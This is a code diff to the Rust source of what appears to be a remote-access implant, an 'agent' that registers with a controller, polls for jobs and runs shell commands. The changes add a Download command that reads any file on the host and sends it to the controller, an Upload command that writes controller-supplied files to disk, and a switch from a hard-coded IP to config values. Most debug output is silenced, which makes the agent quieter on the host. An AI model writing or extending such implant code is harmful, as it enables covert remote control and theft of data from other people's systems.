@@ -1,7 +1,8 @@
 use crate::serializer::Serializer;
+use crate::config;
 
 use std::fs::File;
-use std::io::{BufRead, BufReader, Cursor, Read};
+use std::io::{BufRead, BufReader, Cursor, Read, Write};
 use std::env;
 use std::process;
 
@@ -19,10 +20,13 @@ pub enum Command {
     Register = 0x100,
     GetJob = 0x101,
     NoJob = 0x102,
+    Download = 0x150,
+    Upload = 0x151,
     Shell = 0x152,
     Cd = 0x153,
     Exit = 0x155,
     Output = 0x200,
+    File = 0x201
 }
 
 impl Command {
@@ -30,9 +34,12 @@ impl Command {
         match value {
             0x101 => Command::GetJob,
             0x102 => Command::NoJob,
+            0x150 => Command::Download,
+            0x151 => Command::Upload,
             0x152 => Command::Shell,
             0x153 => Command::Cd,
             0x155 => Command::Exit,
+            0x201 => Command::File,
             _ => Command::Output,
         }
     }
@@ -87,7 +94,7 @@ pub fn register() -> (Serializer, i32) {
                             }
                         },
                         None => {
-                            println!("interface {} with unsupported address family", ifaddr.interface_name);
+                            //println!("interface {} with unsupported address family", ifaddr.interface_name);
                         }
                     }
                 }
@@ -179,7 +186,7 @@ pub fn register() -> (Serializer, i32) {
             payload.add_string("error");
         }
     } else {
-        println!("Failed to read /etc/os-release");
+        //println!("Failed to read /etc/os-release");
     }
 
     return (payload, *ID)
@@ -193,6 +200,12 @@ pub fn build_payload_get_job(agent_id: i32) -> Serializer {
 
 fn build_payload_send_output(agent_id: i32) -> Serializer {
     let payload = Serializer::init(agent_id, Command::Output);
+
+    return payload
+}
+
+fn build_payload_send_file(agent_id: i32) -> Serializer {
+    let payload = Serializer::init(agent_id, Command::File);
 
     return payload
 }
@@ -223,6 +236,45 @@ pub fn handle_response(serialized_data: Serializer) {
     // in big endian.. not really too sure why. havent looked into it
     
     match Command::from_int32(response_code) {
+        Command::Download => {
+            let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
+            let mut string_buffer = vec![0; string_len-2];
+            unpacker.read_exact(&mut string_buffer).unwrap();
+            let filename = String::from_utf8_lossy(&string_buffer);
+
+            let mut payload = build_payload_send_file(*ID);
+            payload.add_data(download_file(filename.to_string()).as_slice());
+            
+            match send(payload.get_buffer(), config::IP, config::PORT, false) {
+                Ok(_) => {
+                    //println!("{:?}", resp);
+                }
+                Err(_) => {
+                    //eprintln!("{:?}", e);
+                }
+            }
+        }
+        Command::Upload => {
+            println!("uploaded file received");
+            let bytes_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
+            let mut bytes_buffer = vec![0; bytes_len];
+            unpacker.read_exact(&mut bytes_buffer).unwrap();
+        
+            let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
+            let mut string_buffer = vec![0; string_len];
+            unpacker.read_exact(&mut string_buffer).unwrap();
+            let filename = String::from_utf8_lossy(&string_buffer[..string_len-2]);
+
+            match File::create(filename.to_string()) {
+                Ok(mut file) => {
+                    match file.write_all(&bytes_buffer) {
+                        Ok(_) => {},
+                        Err(e) => eprintln!("{}", e),
+                    }
+                }
+                Err(e) => eprintln!("{}", e),
+            }
+        }
         Command::Shell => {
             let string_len = unpacker.read_i32::<LittleEndian>().unwrap() as usize;
             let mut string_buffer = vec![0; string_len-1];
@@ -233,12 +285,12 @@ pub fn handle_response(serialized_data: Serializer) {
             let mut payload = build_payload_send_output(*ID);
             payload.add_string(&output);
 
-            match send(payload.get_buffer(), "192.168.209.129", 80, false) {
-                Ok(resp) => {
-                    println!("{:?}", resp);
+            match send(payload.get_buffer(), config::IP, config::PORT, false) {
+                Ok(_) => {
+                    //println!("{:?}", resp);
                 }
-                Err(e) => {
-                    println!("{:?}", e);
+                Err(_) => {
+                    //eprintln!("{:?}", e);
                 }
             }
         }
@@ -251,17 +303,17 @@ pub fn handle_response(serialized_data: Serializer) {
             cd(String::from(path));
         }
         Command::NoJob => {
-            println!("no jobs for da agent");
+            //println!("no jobs for da agent");
         }
         Command::Output => {
-            println!("maybe i havent sent output back yet?");
+            //println!("maybe i havent sent output back yet?");
         }
         Command::Exit => {
             println!("rip. exiting now. x_x");
             exit();
         }
         _ => {
-            println!("unknown command");
+            //println!("unknown command");
         }
     }
 }
@@ -292,6 +344,13 @@ fn cd(path: String) -> bool {
         Err(_) => {
             false
         }
+    }
+}
+
+fn download_file(filename: String) -> Vec<u8> {
+    match std::fs::read(filename) {
+        Ok(data) => return data,
+        Err(_) => return vec![],
     }
 }
 
